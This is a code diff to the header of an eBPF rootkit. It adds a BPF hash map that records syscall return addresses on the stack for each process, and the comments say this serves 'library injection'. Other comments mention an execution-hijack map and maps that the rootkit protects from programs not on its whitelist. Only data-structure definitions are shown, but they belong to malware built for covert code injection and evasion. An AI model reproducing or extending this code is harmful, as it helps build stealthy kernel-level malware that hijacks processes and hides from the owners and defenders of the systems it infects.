@@ -23,6 +23,11 @@ struct fs_open_data{ //Map value
 	int is_sudo;
 };
 
+struct inj_ret_address_data{ //Map value
+	__u32 pid;
+	__u64 stack_ret_address;
+};
+
 struct fs_priv_open{ //Map
 	__uint(type, BPF_MAP_TYPE_HASH);
 	__uint(max_entries, 4096);
@@ -39,6 +44,13 @@ struct exec_var_priv_hijack_active{ //Map
 	__type(value, __u64);
 } exec_var_hijack_active SEC(".maps");
 
+//Return addresses of syscalls in the shared library, for the library injection
+struct inj_priv_ret_address{ //Map
+	__uint(type, BPF_MAP_TYPE_HASH);
+	__uint(max_entries, 4096);
+	__type(key, __u64); //thread group id(MSB) + pid (LSB)
+	__type(value, struct inj_ret_address_data);
+} inj_ret_address SEC(".maps");
 
 /*PROTECTED MAPS*/
 //Any attempt to access these maps will be blocked by the rootkit if the program is not whitelisted
